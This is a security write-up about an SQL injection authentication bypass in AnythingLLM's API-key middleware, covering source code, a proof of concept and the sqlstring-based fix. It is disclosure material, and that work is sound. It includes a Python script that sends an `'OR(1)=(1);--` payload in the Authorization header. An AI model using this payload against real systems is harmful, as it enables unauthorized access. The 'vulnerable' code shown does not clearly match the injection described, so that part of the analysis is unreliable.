


# Overview

This vulnerability was reported by [vxhid](https://huntr.com/users/vvxhid), the vulnerability as quoted in the description:

> The validApiKey middleware, which is responsible for verifying API keys provided in the request's Authorization header, is susceptible to SQL injection. This vulnerability can potentially lead to an authentication bypass, granting unauthorized access to API endpoints.

Aside from the fact that the severity is critical here due to the impact of the SQL injection attack, this vulnerability arises as the application is designed to fetch the Authorization header value and doing a quick lookup in the database to see if that particular token exists or not. Due to lack of proper sanitization as this value could be attacker controlled, it was possible to leverage it for performing SQL Injection.

Source link for the reported vulnerabilities are as follows:
* https://huntr.com/bounties/70a2fb18-f030-4abb-9ddc-13f94107ac9d/


### Source Analysis

As mentioned in the report, the affected file was [](https://github.com/Mintplex-Labs/anything-llm/blob/master/server/utils/middleware/validApiKey.js#L17) which is as follows:

```ts
const { ApiKey } = require("../../models/apiKeys");
const { SystemSettings } = require("../../models/systemSettings");

async function validApiKey(request, response, next) {
  const multiUserMode = await SystemSettings.isMultiUserMode();
  response.locals.multiUserMode = multiUserMode;

  const auth = request.header("Authorization");
  const bearerKey = auth ? auth.split(" ")[1] : null;
  if (!bearerKey) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  if (!(await ApiKey.get({ secret: bearerKey }))) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  next();
}

module.exports = {
  validApiKey,
};
```

As you can see, it extracts the "Authorization" header value by splitting it with the whitespace delimeter and then using the second index value which will be the token i.e. `bearerKey` which is later passed to `ApiKey.get` which is a method to retrieve the key from the database using `prisma` (it is a database toolkit for access and management in TypeScript) which the application is making use of.

```ts
 get: async function (clause = {}) {
    try {
      const apiKey = await prisma.api_keys.findFirst({ where: clause });
      return apiKey;
    } catch (error) {
      console.error("FAILED TO GET API KEY.", error.message);
      return null;
    }
  },
```

### Proof of Concept

How we can say something is vulnerable without the proof-of-concept? Apparently, I was having trouble setting up the vulnerable version of the application even with the docker so I am going to reference it from the report itself:

```py
import requests

url = "http://localhost:3001/api/v1/system"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://localhost:3000/",
    "Connection": "close",
    "Authorization": "Bearer not_valid_api_key'OR(1)=(1);--", # Injection here
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "If-None-Match": "W/\"773-MdgLun6ESFXPFk/WGHQAe92jMuI\"",
}

response = requests.get(url, headers=headers)

print(response.text)
```

Here, as you can see the value of the "Authorization" header is `Bearer not_valid_api_key'OR(1)=(1);--`, now according to what we saw the data process will happen eventually taking the value `not_valid_api_key'OR(1)=(1);--` which will be passed to the key retrieval function insecurely resulting in SQL Injection.

### Fix

This was fixed by the maintainer of the repository made a commit escaping quotes which may lead to any potential harm by using `escape` function of [sqlstring](https://www.npmjs.com/package/sqlstring) package.

The patched code:

```ts
const { escape } = require("sqlstring-sqlite");
const { ApiKey } = require("../../models/apiKeys");
const { SystemSettings } = require("../../models/systemSettings");

async function validApiKey(request, response, next) {
  const multiUserMode = await SystemSettings.isMultiUserMode();
  response.locals.multiUserMode = multiUserMode;

  const auth = request.header("Authorization");
  const bearerKey = auth ? auth.split(" ")[1] : null;
  if (!bearerKey) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  if (!(await ApiKey.get(`secret = ${escape(bearerKey)}`))) {
    response.status(403).json({
      error: "No valid api key found.",
    });
    return;
  }

  next();
}

module.exports = {
  validApiKey,
};
```